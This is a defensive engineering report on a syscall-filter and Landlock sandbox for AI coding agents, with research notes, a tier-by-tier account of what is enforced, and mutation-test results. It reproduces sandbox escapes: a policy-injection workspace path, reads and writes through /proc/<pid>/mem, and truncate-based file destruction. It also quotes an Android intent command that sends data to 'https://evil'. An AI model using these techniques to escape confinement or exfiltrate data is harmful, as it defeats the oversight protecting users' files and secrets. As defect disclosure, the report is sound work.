# Phone-sandbox: what was researched, what was built, and what it actually enforces

**Branch:** `feat/phone-sandbox` · worktree `/root/atlan-sandbox` · code commit `349e23d`
**Measured:** 2026-08-05 on the WSL2 accessory node — kernel `5.15.153.1-microsoft-standard-WSL2`, x86_64, Landlock **ABI 1**, YAMA absent (`ptrace_scope` effectively 0), `dev.tty.legacy_tiocsti` sysctl absent (pre-6.2, so TIOCSTI is unconditional here).
**Not measured:** the phone. Zero on-device transcripts exist. Every number in this document is from the accessory. That is stated once here and again wherever it matters.

---

## 0. Verdict, before anything else

**The T1 claim holds on the accessory and is not yet proven anywhere else. The T2 and T3 claims, as currently written in `tiers.js`, are FALSE on this node.** Three separate defects, each reproduced first-hand while writing this report, each of which lets a hostile process defeat the boundary the tier's own UI string promises — while the ledger records a success.

The only reason this is a defect report and not an incident report: **`declaredTier()` defaults to `T0` on every host** (`server/src/config.js:75`), so the confinement path is opt-in and nothing today runs behind a boundary that does not hold. Nobody is exposed. What is exposed is a set of sentences that would have been untrue the moment someone flipped the flag.

| Claim | Status |
|---|---|
| T1 capability removal, kernel-enforced, on WSL2 | **Holds.** 15/15 rungs green; verified by attack |
| T1 on unrooted Android | **Unmeasured.** Mechanism is sound on paper; no device transcript |
| T2 egress denial | **Broken two ways** (D1 policy injection, D2 `/proc/<pid>/mem`) |
| T3 filesystem boundary | **Broken two ways** (D1 policy injection, D3 `truncate(2)`) |
| "It is not a sandbox on the phone" | **Holds, and is the one thing the whole exercise got right** |

---

## 1. Every vector researched — what was tried, how, and the result

Five mechanisms were researched against the primary platform (unrooted Android + Termux, with or without proot) and against the accessory (Linux/WSL2). Every one was tested by **attempting the operation and reading the kernel's answer**, never by reading a config flag, a version string, or a file under `/proc/sys` or `/sys/kernel`. That rule is not stylistic — it was earned, and §1.6 records what happened each time someone trusted a flag.

### 1.1 Unprivileged user namespaces (`CLONE_NEWUSER`) — the bubblewrap primitive

**How it was tested.** AOSP source read directly: `init/Kconfig` (`config USER_NS … default n`), `arch/arm64/configs/gki_defconfig` across android12-5.10, android14-6.1, android15-6.6, android16-6.12 (savedefconfig output — absence means left at default), `include/linux/user_namespace.h` (`!CONFIG_USER_NS` stub returns `-EINVAL`), `include/linux/pid_namespace.h` (`# CONFIG_PID_NS is not set`, stub returns `ERR_PTR(-EINVAL)`), bionic's `SECCOMP_BLOCKLIST_APP.TXT` and `seccomp_policy.cpp` (`Disallow()` = `SECCOMP_RET_TRAP`). Then a **live probe on the accessory**:

```
setpriv --reuid=65534 unshare -Urm --propagation private -- \
  sh -c 'mount -t tmpfs t /mnt && cat /etc/hostname'
```

**Result — Android: absent, not weak.** Three independent layers each individually foreclose it. `unshare(CLONE_NEWUSER)` → `EINVAL` (not built). `CLONE_NEWPID` → `EINVAL` (explicitly unset, so `/proc` can never be honestly re-mounted even for real root). `mount`/`umount2`/`chroot` are not denied but **SIGSYS-killed** by the inherited zygote filter, and the entire new mount API (`fsopen`/`fsmount`/`open_tree`/`move_mount`/`mount_setattr`/`openat2`) is in neither bionic list. The custom-ROM counterfactual dead-ends too: `unshare` and `pivot_root` are permitted, but `pivot_root` requires `new_root` to already **be** a mount point and only `mount()` makes one.

**Result — accessory: the probe printed `MOUNTED-IN-NS` and then `CAN-STILL-READ-HOST-ETC`.** A user namespace confines nothing by itself; it is permission to build a confinement, not a confinement. That single line is why "a namespace was created" was rejected as an availability test everywhere in this design.

**Rejected.** Writing namespace code for the primary platform is writing code that cannot execute.

### 1.2 seccomp-bpf after `PR_SET_NO_NEW_PRIVS`

**How it was tested.** `kernel/seccomp.c` read for capability gates (the only `CAP_SYS_ADMIN` sites are `seccomp_prepare_filter`'s NNP-or-CAP alternative, `seccomp_get_filter`, `seccomp_get_metadata`, `write_actions_logged`, `proc_pid_seccomp_cache` — `NEW_LISTENER` is gated on nothing extra). bionic's `SECCOMP_ALLOWLIST_COMMON.TXT` read for `seccomp(unsigned, unsigned, void*) all` — present, and present since Android 8.0 under bug b/34763393. Then live on the accessory as **uid 65534 with no capabilities**: `PR_SET_NO_NEW_PRIVS` → 0, then `SECCOMP_SET_MODE_FILTER | SECCOMP_FILTER_FLAG_NEW_LISTENER` → fd 3.

**Result.** Available unprivileged. Filters stack under Android's, are inherited across `fork` **and** `execve`, and can never be removed. The composition arithmetic with proot is favourable and was checked numerically: `RET_ERRNO` (0x00050000) outranks proot's `RET_TRACE` (0x7ff00000) so a denial never reaches proot, while `RET_ALLOW` (0x7fff0000) loses to it so proot keeps translating everything we permit.

**Adopted as the core of the design.** One caveat carried into the code: bionic's app allowlist **shrinks** — Android 15 dropped `set_robust_list` and broke proot-distro's glibc overnight. Nothing guarantees `seccomp` stays on it, which is why the probe is behavioural and the failure is fail-closed rather than a version check.

### 1.3 Landlock LSM

**How it was tested.** `docs.kernel.org` + `landlock.7` for the ABI-to-kernel table; GKI defconfig greps (`CONFIG_SECURITY_LANDLOCK` absent from android14-6.1 and android15-6.6, `=y` only from android16-6.12); bionic's three input lists for `landlock_*` (**absent from all three**, so the app filter answers with `SECCOMP_RET_TRAP`); Termux issue #19347 as observed confirmation — `si_code=SYS_SECCOMP, si_syscall=__NR_landlock_create_ruleset` on a Pixel 8 Pro. Then live on the accessory, five scripts, each attacking a specific claim.

**Results, measured:**

| Attempt | Result |
|---|---|
| Jail to `/usr`, then `open()` outside | `EACCES` — a real boundary, including reopen via `/proc/self/fd/N` |
| Survive `execve`, inherit to children | Both hold |
| Thread spawned **before** `restrict_self` | **Read `/etc/hostname` and created a file outside the grant.** Total bypass |
| fd passed in over `SCM_RIGHTS` | **Read a denied file's contents.** Checks happen at `open()`, not at `read()` |
| `stat` / `chmod` inside an enforcing domain | **Both succeeded.** Metadata syscalls are unhooked |
| Outbound TCP from inside the jail | **Connected to 1.1.1.1:53.** ABI 1–3 has no network hook at all |
| Layer 17 | `E2BIG` — 16-layer stack limit |
| Under `proot` and `proot -r` | Enforcement **intact** — grants take an fd naming a real inode, so path rewriting is irrelevant |
| `/sys/kernel/security/lsm` while Landlock was actively enforcing | **The path did not exist.** The flag file lied, pessimistically |

**Adopted for the accessory only (T3); probe-only on the phone.** The pre-existing-thread bypass is the reason the launcher is a separate binary rather than a Node addon: applied from inside Node, Landlock would jail synchronous fs calls while the entire libuv threadpool ran unrestricted, and a synchronous self-check would report "confined". That is the exact shape of lie this project exists to refuse.

### 1.4 Userspace interposition without kernel help

**How it was tested.** proot source inspection (`src/syscall/seccomp.c`, `src/syscall/enter.c`, `src/ptrace/ptrace.c`); `ptrace(2)`, `seccomp_unotify(2)`, `syscall_user_dispatch` docs; arm64 `syscall_trace_enter()` ordering (`/* Do the secure computing after ptrace */`); the seccomp action-precedence table.

**Results.** `LD_PRELOAD` enforces no security property: `env -i`, `unsetenv`, `dlsym(RTLD_NEXT)`, inline `svc #0`, and — decisively — **every static binary an AI coding agent already shells out to** (`rg`, `gh`, `bun`, `esbuild`, the Go toolchain) never consults the dynamic linker. ptrace supervision **fails open by default** — *"if the tracer dies, all tracees are automatically detached and restarted"* — which is the plainest possible violation of this project's fail-closed rule; the single tracer slot is already held by proot, whose request switch has **no case for `PTRACE_SEIZE`** at all, and `PTRACE_TRACEME` sets `tracee->seccomp = DISABLING` for the whole subtree. gVisor needs the user namespaces the phone does not have.

**Rejected entirely — and one active danger recorded.** Layering a `USER_NOTIF` filter on path-bearing syscalls *under proot* makes our action outrank proot's `RET_TRACE`; proot silently stops translating and guest paths resolve against the real Android root. The sandbox becomes the rootfs escape, and proot cannot even observe it happening because it never inspects the `seccomp(2)` syscall form. That is why `USER_NOTIF` is confined to a recorded probe result and claimed nowhere.

### 1.5 Egress control — six candidates

**How it was tested.** Landlock's net rule struct read directly (`{allowed_access, port}` — **a port and nothing else, no address field**, so allowing 443 allows every host on the internet); GKI configs for netns; bionic lists; Android's resolver path to `netd` over the AF_UNIX socket `/dev/socket/dnsproxyd`; the `NEW_LISTENER` live probe from §1.2; VpnService's documented scope.

**Results.** Landlock net: unreachable on the phone and not an egress control anywhere. Net namespaces: unavailable. Forced proxy (`HTTPS_PROXY`) and DNS control: **advisory** — honoured voluntarily, removed with one env assignment; not boundaries. VpnService: a real packet-layer gate, but it needs a signed APK, a consent dialog, per-**package** scope that cannot distinguish the agent from Atlan's own server (same Termux UID), and a Settings toggle only the user or a device policy controller can flip — a separate product, not a layer. **`socket(domain, …)` denial: adopted** — the address family is a scalar in a register, so "this process may never create a socket" is four BPF instructions, exact, race-free, irrevocable, inherited. Denying `AF_UNIX` alongside `AF_INET` is what closes the `dnsproxyd` DNS covert channel and the loopback path to Atlan's own cockpit. The `USER_NOTIF` connect-broker was **deferred** by all three judges and by the design: 600–1500 LOC, a second long-lived native process per run, version-gated on `ADDFD`, DoS-able by notification flooding, `EBUSY`-able by any first mover, and actively harmful under proot.

### 1.6 The banned-inputs list, and why each one is on it

Every entry here was shown to lie in at least one direction on a platform Atlan ships to:

- **`/proc/sys/user/max_user_namespaces`** — `kernel/ucount.c` registers it unconditionally with no `CONFIG_USER_NS` guard, and `fork_init()` fills every `ucount_max`. It **exists and reads a large positive number on a kernel built without user namespaces.**
- **`/proc/sys/kernel/unprivileged_userns_clone`** — a Debian downstream patch that has never existed upstream or on Android. Its absence carries no information.
- **`/sys/kernel/security/lsm`** — measured absent on a box where Landlock was actively enforcing (§1.3).
- `uname`, Android release, `ANDROID_*`, `which bwrap`, `/proc/self/status` `TracerPid`, and **any verdict cached across a boot or a package update.**

**One correction to the research and to all three judge verdicts.** Every judge led with "the most urgent thing in the tree is `enginePolicy.js sandboxCapableHost()` reading `max_user_namespaces`." On this base **that code does not exist** — it lives on the unmerged `feat/cross-engine-orchestration` branch. Verified: the only occurrences of that path anywhere in `server/src/` are two comments explaining why it must never be read. The headline "fix this first" item was a phantom on this branch. It remains a live defect on the branch that carries it.

---

## 2. Mechanism ranking, and why each was chosen or rejected

Three judges scored the same five mechanisms through different lenses: (A) does it work on a stock unrooted phone today, (B) real boundary vs. speed bump against a hostile agent with a shell, (C) minimalism and durability.

| Mechanism | A | B | C | Σ | Disposition |
|---|---|---|---|---|---|
| seccomp-bpf (cBPF, scalar args) | 9 | 9 | 9 | **27** | **Core of the design** |
| socket-family denial + connect broker | 7 | 8 | 5 | **20** | Denial adopted at IP-2; broker deferred |
| Landlock LSM | 1 | 6 | 8 | **15** | Accessory only (T3); probe-only on phone |
| User namespaces / bubblewrap primitive | 0 | 7 | 2 | **9** | **Rejected** |
| Userspace interposition (LD_PRELOAD/ptrace/gVisor) | 2 | 1 | 1 | **4** | **Rejected** |

**seccomp wins unanimously, and it wins for one reason:** it filters the syscall itself, so "compile your own static binary and issue a raw `svc #0`" is what it *catches* rather than what beats it. It cannot be removed, it is inherited across `fork` and `execve`, there is no supervisor whose death opens the gate, and installation failure means no `execve` — fail-closed is structural, not bolted on. Its weakness is not evadability but **expressiveness**: classic BPF cannot dereference a pointer, so a filter sees that `openat()` was called but never *which path*. **seccomp provides no filesystem policy at any privilege level on any platform.** That is the most important sentence in this report, because a workspace boundary is exactly what `containment.js` reaches for.

**Landlock is the only mechanism whose score rises with kernel releases** (ABI 4 TCP, 5 ioctl, 6 scoping, 8 TSYNC retires its own worst defect) and its marginal cost is ~80 lines on a launcher seccomp already forces us to build. It was adopted despite Judge A scoring it 1, because A was scoring *the phone claim* and C was scoring *the code cost* — both are right, and the resolution is: build it, and never mention it in phone-facing copy until the on-device probe returns green.

**User namespaces were rejected despite Judge B's 7.** B is correct that where the full chain succeeds it is the strongest confinement available — a `pivot_root` into a tmpfs root makes outside paths structurally non-existent. But it is absent on the primary platform, it is *rotting* on the accessory (Ubuntu 24.04's `apparmor_restrict_unprivileged_userns`, with three published bypasses, means the probe's verdict cannot even be cached across a package update), the mount plan grows a new correctness hazard per bind, and handing a hostile agent `CLONE_NEWUSER` trades ~3.4× kernel attack surface for process containment. Highest code cost, least durable enforcement, zero value on the device that matters.

**Userspace interposition was rejected on the lens's own terms**, not on availability. It runs fine on the phone and confines nothing there.

---

## 3. What is actually enforced, per tier and per platform

These are the strings from `server/src/sandbox/tiers.js`, which is their only home; `docs/SECURITY.md` quotes them verbatim and `test/docdrift.mjs` fails the commit that lets the two diverge. **Two of the four are currently false and are marked as such.** They must not ship as written.

### T0 — no confinement · every platform · **accurate today**

> **No OS confinement on this run.** The agent runs as your user with no syscall filter and no filesystem boundary. It is working in a disposable copy of your project and nothing reaches your real tree until you approve a diff — that is containment against error, not against attack. This run was explicitly allowed to start ungated.

This is the default everywhere. It is not a silent degrade: the string says so in words.

### T1 — capability removal · **accurate on WSL2, unmeasured on Android**

> **Capability removal, enforced by the kernel.** Before this agent started, Atlan installed a syscall filter it cannot remove and that every process it spawns inherits. It cannot use `io_uring`, `ptrace`, `process_vm_writev`, `pidfd_getfd`, `userfaultfd`, `bpf`, `perf_event_open`, `keyctl`, `unshare`, `setns`, `mount`, or the 32-bit syscall table.
>
> **It does not confine the filesystem.** On an unrooted Android device there is no filesystem boundary available to an app — not to Atlan, not to anything. This agent can still read every file your Termux user can read, including the other agent CLIs' saved logins. Its writes go to a disposable copy and nothing reaches your project until you approve a diff.
>
> **This is capability removal plus containment against error. It is not a sandbox.**

Measured on the accessory: real filter is **589 BPF instructions**, arch guard is instruction 0 and **kills**, tail is `KILL_PROCESS`, filter survives `execve` and three-deep forks, every named capability returns `EPERM` under the real filter, and an unlisted syscall (`vhangup`) is fatal. Attacked directly: raw `syscall(SYS_ptrace)` → `EPERM`, `io_uring_setup` → `EPERM`, `unshare -U`/`mount`/`chroot` → refused, planted high fds closed by `close_range` before `execve`.

**The one word that needs adding.** The sentence "it cannot use `ptrace`, `process_vm_writev`" is true about the *syscalls* and, as §4 D2 shows, **not true about the capability** those syscalls name. It should say what it removes, not what that implies.

### T2 — egress denial · ⚠️ **CURRENTLY FALSE — do not ship**

> **Everything in T1, and this shell cannot open a network socket.** `socket()` is refused by the kernel for every address family, including AF_UNIX — so it cannot reach the internet, cannot reach Atlan's own cockpit on loopback, and cannot smuggle data out through Android's DNS resolver socket. The refusal is inherited by anything it starts.
>
> **This applies to shell commands the agent runs. It does not apply to the agent itself** — an agent CLI is the thing talking to the model provider, so its own connection stays open by necessity.

Sentence two is sound and is the best decision in the design (§3.1). Sentence one is defeated by **D1** (a `;` in the workspace path forges `egress=open` while the ledger records `denied`) and by **D2** (`/proc/<ppid>/mem` reaches the unconfined Node supervisor's memory — and therefore its live sockets — with no socket call at all).

### T3 — filesystem boundary · accessory only · ⚠️ **CURRENTLY FALSE — do not ship**

> **Everything above, and a real filesystem boundary.** Paths outside this workspace and its toolchain do not resolve for this agent — the kernel refuses at `open()`, and the refusal is inherited by every process it starts. Only this engine's own saved login is readable; the other CLIs' tokens, your SSH keys and Atlan's key store are outside the grant.
>
> **Honest limits:** it does not cover file descriptors the agent was handed at startup, it does not hook `stat`/`chmod`/`chown`, and a network-capable process inside the boundary can still send out what it can read.

The *confidentiality* half held under sustained attack (§5). The **integrity** half does not: `truncate(2)` destroys any nameable file outside the grant on Landlock ABI ≤ 2 (**D3**), and the honest-limits list does not mention it. And D1 forges grants past the credential check entirely.

### And the Doctor's line when the phone says no — **accurate, and the best sentence in the set**

> **Filesystem confinement: unavailable on this device.** Not disabled, not skipped — Android's own app syscall filter kills the calls that would create it. Atlan checks by attempting it every boot; if a future Android permits it, this turns green without a code change.

### The honest per-platform summary

| | Native Linux / WSL2 | Unrooted Android + Termux |
|---|---|---|
| Capability removal | **Real**, measured, 15/15 rungs | **Unmeasured.** Mechanism sound on paper (`seccomp` is bionic-allowlisted since Android 8.0); no device transcript exists |
| Egress denial (shell children) | Mechanism real; **claim broken by D1/D2** | Same, plus: never covers Binder/`am start`, which exfiltrates through another UID with no socket call |
| Filesystem boundary | Landlock ABI 1 real for reads; **integrity broken by D3**, grants forgeable by D1 | **None. Not weak — absent.** No mechanism exists for an unrooted app |
| Honest word for it | "confinement", tier-qualified | **"capability removal"**, never "sandbox" |

---

## 4. Mutation-test results

Run first-hand for this report: `node test/mutation.mjs`, 34 mutants, each removing or inverting exactly one control, suite re-run per mutant, tree verified byte-identical at the end.

```
=== 29 caught, 5 escaped, of 34 ===
baseline green (99 assertions) · tree restored byte-identical
```

**Caught (29)** — each of these controls has a test that goes red when it is removed:
`M01` arch guard → ALLOW · `M02` default tail → ALLOW · `M03` io_uring dropped from deny set · `M04` ptrace/process_vm dropped · `M05` egress denial no-op · `M06` Landlock built but never entered · `M07` Landlock read rights only · `M08` seccomp never installed · `M09` L1 fd hygiene skipped · `M10` NNP skipped · `M11` unknown policy directives ignored · `M12` tty on stdout/stderr accepted · `M15` egress rung skips its baseline · `M17` ladder climbable from the middle · `M18` `assertTier` always passes · `M19` missing rung counts green · `M20` phone tier calls itself a sandbox · `M21` credential grant check disabled · `M22` reachability check disabled · `M23` `/etc`+`/proc`+`/dev` granted wholesale · `M24` IP-1 egress denied too · `M25` workspace bypasses `guards.js` · `M26` `/tmp` granted instead of per-run scratch · `M27` probe trusts a wrong sentinel · `M29` compiler accepted without running its output · `M30` IP-2 quoting removed · `M31` IP-2 silently skips confinement · `M32` IP-1 silently spawns unconfined · `M33` policy accepted from a path.

**Escaped (5), with what each would have removed:**

| | What it removed | Why it escaped |
|---|---|---|
| `M13` | The sentinel rung accepts **any** errno — the floor, i.e. proof the kernel arbitrates *our* decision rather than that a syscall happened to fail | Mutates the probe's own strictness. On a host where the capability is present, a laxer check still reads green. Not falsifiable from outside without building test hooks into the launcher |
| `M14` | The io_uring rung accepts any failure, not our `EPERM` — "happens to fail" is not a design | Same class |
| `M16` | The Landlock rung drops its inside-the-grant half — denying everything would read as enforcing something | Same class |
| `M28` | A malformed probe treated as a capability | **Equivalent mutant** — both paths yield T0 |
| `M34` | Nothing (comment reworded) | **No-op control. It MUST escape**, or the suite is asserting on prose |

**The finding the mutation score hides, and it is the important one.** `M04` is listed as CAUGHT — remove `ptrace`/`process_vm_readv`/`process_vm_writev` from the deny set and the suite goes red. But the *property* that mutant is named after — "sibling-process memory read and write" — **is false anyway**, via `/proc/<pid>/mem` (D2). The test asserts the mechanism (`ptrace(2)` returns `EPERM`); the goal the mechanism exists to serve is reachable by another road entirely.

**Mutation testing measures whether your tests notice a control being removed. It does not measure whether the control achieves the thing it is named after.** A 29/34 score against a suite that never asked "can this process read another process's memory?" is a well-tested implementation of an incomplete idea. That is the single most useful thing this exercise produced, and it generalises past this branch.

---

## 5. The three adversarial layers — what broke, and what held

**Layer 1: mutation harness** (§4) — 29/34, and the blind spot above.
**Layer 2 and 3: contextless attackers**, each given only the compiled launcher and a target, told they could compile and run arbitrary code at the same uid.

**A disclosure about the evidence.** Three attackers were launched; **two transcripts are in hand.** The third produced no output. An absent transcript is missing evidence, not a clean bill of health, and it is recorded that way here rather than rounded up to "three attackers found nothing more."

Per the standing rule that no adversarial finding is acted on until a second checker confirms it, I re-ran the two highest-severity claims myself against the shipped code before writing this section. Verification status is stated per finding.

### Defects — confirmed

**D1 — Policy injection through the IP-2 transport. Both attackers found it independently; I confirmed it third. CONFIRMED ×3.**

The IP-2 path serializes the policy by joining lines with `;` (`confine.js:77`), the launcher converts every `;` back to a newline (`atlan-confine.c:1283`), and the only structural guard refuses a `\n` and **never a `;`** (`plan.js:200`). `cwd` is client-supplied (`index.js:171`, `:461`), stored raw, and at T1/T2 never passes through `guardPath` at all. So any `;` in a workspace path forges directives. Reproduced:

```
workspace : "/tmp/v3/ws;egress=open"
  ledger  : {"egress":"denied","fs":"none"}     <-- what the receipt records
  launcher sees -> tier=T2 | egress=deny | fs=none | cwd=/tmp/v3/ws | egress=open
  socket() = 3 (OPEN -> EGRESS BOUNDARY DEFEATED)
```

Attacker B additionally showed the T3 form: terminate the payload with `;#` so the trailing `scratch=` line comments out, name the workspace `/root/proj;ro=/root;#`, and a forged `ro=/root` grant lands **without passing through `assertGrantsSafe` at all** — reading a secret outside the workspace while the ledger reports `fs: "landlock+workspace"`. Note the shape: `isSensitive` is a regex and would catch `.ssh`; granting the *parent* `/root` defeats it, which is the regex-dependence the project's own constraints forbid.

This is **fail-open while reporting success**, which is worse than a missing feature, and it does not need an attacker: a legitimate project directory containing a `;` (legal on Linux and Android) silently drops enforcement while the receipt says it held. `plan.js`'s own comment claims this is defended. It defends the wrong delimiter.

**D2 — `/proc/<pid>/mem` defeats T2 entirely. Attacker A; I confirmed. CONFIRMED ×2.**

`ptrace`, `process_vm_readv`, `process_vm_writev`, `process_madvise`, `pidfd_getfd` are all denied — **as syscalls**. `/proc/<pid>/mem` is a *path*, reached with `open` + `pread64`/`pwrite64`, all three in the allow-list, and at T2 there is no Landlock to mediate a path. Reproduced:

```
socket() = -1 (Permission denied)          <-- egress genuinely denied
open(/proc/618996/mem) = 3 (OPEN)
pread @ 0x561587992020 = 40 -> "VICTIM-PROCESS-SECRET-TOKEN-zzz999"
```

Attacker A went further and demonstrated `pwrite` into the parent — arbitrary code execution in an unconfined, networked process. In production the confined `/bin/sh` at IP-2 is a child of the Node supervisor that holds the key store, the session store and live sockets, so this is the confused deputy T2's string explicitly claims to close.

**Conditions, stated honestly:** demonstrated at uid 0 with YAMA absent (verified: `/proc/sys/kernel/yama/ptrace_scope` does not exist on this node), where `ptrace_may_access` reduces to a same-uid check. Under `yama.ptrace_scope ≥ 1` the parent-direction read is blocked (the parent is an ancestor, not a descendant) and the reachable-target set narrows to descendants — the seccomp gap remains either way. On Android, Termux processes share one UID and one SELinux domain (`allow untrusted_app self:process ptrace`), so the hole plausibly exists there too; **that is inference, not measurement.**

**T3 holds against it:** the identical read at T3 → `EACCES` (verified). Landlock is what closes this, which is precisely the mechanism the phone does not have.

**D3 — `truncate(2)` destroys files outside the T3 grant. Attacker A; I confirmed. CONFIRMED ×2.**

`truncate`/`ftruncate` are in the allow-list; `LANDLOCK_ACCESS_FS_TRUNCATE` is bit 14, **ABI 3**, and this node is ABI 1, so the grant loop's ABI mask cannot cover it. Reproduced against a real `plan()` policy:

```
open(/tmp/v2/outside/victim.txt) = -1 (Permission denied)
truncate(/tmp/v2/outside/victim.txt,0) = 0 (SUCCEEDED)
--- victim.txt AFTER: 0 bytes ---
```

A T3 agent cannot *read* your SSH key, `.keys.enc`, another engine's token, or your git objects — and can **zero every one of them**. The T3 honest-limits list discloses `stat`/`chmod`/`chown` and says nothing about `truncate`. Same undisclosed class covers `setxattr` and `utimensat` at lower impact. On ABI ≥ 3 the mask includes TRUNCATE and this is mediated — so it is an ABI-version gap shipped without a warning, on exactly the ABI range the phone would land in if Landlock ever became reachable there.

### Defects — plausible, one checker only, not independently verified

**D4 — TIOCSTI via a fresh `open("/dev/tty")` at T1/T2.** `ioctl` is allowed unconditionally. The launcher's tty mitigation refuses an *inherited* tty on 1/2 and replaces stdin, but nothing stops a new open. Attacker A demonstrated `TIOCSTI ACCEPTED`. If the Atlan supervisor has a controlling terminal — typical when started from an interactive Termux shell — this types commands into the operator's shell, outside all confinement. Gated by whether a controlling tty exists and by `dev.tty.legacy_tiocsti` (verified absent on this pre-6.2 node, i.e. unconditional here). T3 blocks it (`/dev/tty` outside the grant). **I did not re-verify this; it needs a controlling terminal I did not have.**

**D5 — `/bin/sh` is hardcoded** at `confine.js:79`. On native Termux there is no `/bin/sh`, so every T1+ Bash tool call would fail to exec on the primary platform. The hardcode is code-evident and contradicts `build.js`'s own discover-don't-hardcode discipline; the Termux consequence is **inferred, not measured** (under `proot-distro` there is a `/bin/sh`, so it depends on how Atlan is deployed).

**D6 — the Doctor shows the confinement row GREEN when nothing is enforced.** `ok = established >= declared`, and the default declaration is T0, so T0/T0 renders green. The detail text is honest; the row colour is reassurance the state has not earned.

**D7 — TOCTOU on a grant path.** `plan.js` realpaths the workspace ancestor at check time; the launcher re-opens the path string later with `O_PATH` and no `O_NOFOLLOW`. A symlink swap in between could repoint the granted inode. **Unproven — no race PoC was built.**

### What HELD, under sustained attack

This is not a report of only successes, and the things that held are load-bearing:

- **The seccomp layer did what it says.** Raw `syscall(SYS_ptrace)` → `EPERM` (the filter matches `seccomp_data.nr`, so libc indirection and `LD_PRELOAD` games are irrelevant). `io_uring_setup` → `EPERM`. The whole namespace/mount family → `EPERM`; a userns obtained via `clone` grants nothing because `mount` is gone. x32/compat numbers hit the default-deny tail. `NO_NEW_PRIVS` set. Tail is `KILL_PROCESS`. **Arch guard is instruction 0 and kills.** Filter survives `execve` and three-deep forks.
- **fd hygiene held.** The fd-3 policy pipe and a deliberately planted high fd were both closed by `close_range` before `execve`; the confined child saw only 0/1/2.
- **T3 confidentiality held against everything thrown at it:** absolute path, relative `../`, deep traversal, `/etc/shadow`, symlinked file, symlinked directory, `/proc/self/root/*`, `/proc/self/cwd/..`, `/proc/<other>/mem`, cross-directory hardlink — **all refused.**
- **IP-1 resisted the D1 payload.** It ships the policy over **fd 3 with real newlines** and the `@fd` branch does not convert `;`; the poisoned value was treated as one string and the launcher **failed closed** (`chdir: No such file or directory`, exit 70). The design's "a path is a TOCTOU surface, use an fd" instinct is what saved it — the defect is entirely in the argv convenience transport bolted on beside it.
- **The probe is genuinely behavioural.** Attacker B checked specifically: every rung forks a child, performs the operation, and reads the kernel's verdict. Nothing reads `/proc/sys`, `/sys/kernel`, `uname`, or `ANDROID_*`. 15/15 green here.
- **The uncovered spawn sites are disclosed in code, not hidden** (`confine.js:14-16` names `build.js:71`, `pty.js:46`, `studio.js:72`).
- **The honesty controls are themselves tested.** `M20` — "the phone tier calls itself a sandbox" — is caught.

---

## 6. What this is NOT

**Read this section before repeating any claim from this branch.**

- **NOT a sandbox on the phone.** It is capability removal. There is no filesystem boundary available to an unrooted Android app — not to Atlan, not to anything — and no amount of this code creates one.
- **NOT measured on the phone at all.** Every number here is from one WSL2 x86_64 node with Landlock ABI 1 and no YAMA. The primary platform has zero transcripts. Until that changes, "works on Android" is a mechanism argument, not a result.
- **NOT currently truthful at T2 and T3.** D1, D2 and D3 each defeat a boundary its own UI string promises. The strings are marked in §3 and must not ship as written.
- **NOT a bubblewrap wrapper or a reimplementation of one.** The namespace family is absent on Android, not weak.
- **NOT proot-based.** proot is ptrace path rewriting at the same uid under the same inherited filter, granting zero capabilities; it writes translated paths into the tracee's own memory, which a sibling thread on an SMP phone races. It is never named as part of the boundary.
- **NOT `LD_PRELOAD`, a ptrace supervisor, or gVisor.** Rejected in §1.4, including the recorded danger that `USER_NOTIF` on path-bearing syscalls under proot converts the sandbox into a rootfs escape.
- **NOT regex-, pattern-, or string-based in the enforcement path** — decisions are on `seccomp_data.nr`, `seccomp_data.arch`, a scalar `domain` register, and inode-attached grants. **But the credential deny-list `isSensitive` IS a regex**, and D1 showed how to walk around it by naming a parent directory.
- **NOT protection against already-open file descriptors.** Landlock checks at `open()` and never at `read()`; seccomp cannot see an existing handle. L1 fd hygiene is what covers this, and it covers only what the launcher itself closes.
- **NOT an exfiltration defence at IP-1.** An agent CLI must reach its provider; once that host is reachable, a prompt-injected agent has a bidirectional channel to a host we blessed. The ledger says `open-to-provider`, never `gated`.
- **NOT a defence against Binder.** `am start -a android.intent.action.VIEW -d https://evil/?data` exfiltrates through another UID with no socket call at all, and a write into `~/storage/shared` leaves via a sync app's UID. Nothing in this design sees either.
- **NOT a defence against the confused deputy in general.** Atlan runs a local HTTP server at the same uid. T2's `AF_UNIX`+`AF_INET` denial removes *reachability* for Bash children when it works — and D2 shows there is a second road to the same deputy that does not use a socket.
- **NOT covering every spawn site.** `build.js:71`, `pty.js:46` (Term tab) and `studio.js:72` all still spawn unwrapped.
- **NOT a replacement for `containment.js`.** The disposable workspace and the diff gate remain the phone's primary boundary, and `containment.js`'s own sentence — *containment against ERROR, not against ATTACK, and it must never be described as a sandbox* — is unchanged and still accurate.
- **NOT resource containment.** No cgroups: fork bombs, disk fill and memory pressure are untouched, on every platform.
- **NOT covering metadata.** `stat`, `access`, `chmod`, `chown`, `setxattr`, `utimensat` are unhooked by Landlock ABI 1 — and `truncate` is too, which is D3.
- **NOT on by default.** `declaredTier()` returns `T0` everywhere until a device transcript exists. This is why the three defects are not live exposures.
- **NOT tested by a suite that asks the right question.** §4: the tests assert mechanisms, not properties. D2 lives in that gap.
- **NOT fully adversarially reviewed.** Two of three attacker transcripts arrived; D4–D7 have one checker each and D7 has no PoC.

---

## 7. Top three things to do next

**1. Fix D1 by deleting the transport, not by adding a check.** The `;` guard is the wrong fix — it is the same class of error as the `\n` guard that already exists and misses. IP-1 already does this correctly: the policy travels on a **file descriptor**, and when handed the poisoned value it failed closed. Make IP-2 do the same (a pipe fd through the SDK's shell, or a `memfd` inherited across the rewrite), delete the argv-literal branch and its `;` conversion from `atlan-confine.c` entirely, and route `cwd` through `guardPath` at **every** tier rather than only inside the T3 branch. Then add the test that was missing: assert that a workspace path containing `;`, `\n`, `#` and `=` either refuses or produces a byte-identical policy. Until this lands, T2 and T3 are declarations, not boundaries.

**2. Close D2 and D3 — and re-derive the deny set from properties instead of syscall names.** The immediate fixes are small: deny `truncate`/`ftruncate` outright wherever the Landlock ABI cannot mediate them (they are not needed by anything an agent does that `O_TRUNC` on an already-granted open cannot), and block the `/proc/<pid>/mem` road — which on the accessory means Landlock at T2 as well as T3, and on the phone means it **cannot be closed**, so the T1/T2 strings must say that a confined process can still read the memory of other processes owned by the same user. Then do the larger thing: for each capability the UI *names*, enumerate every road to it and test the **property** ("this process cannot read another process's memory"), not the mechanism ("`ptrace` returns EPERM"). D2 is the template for what that catches.

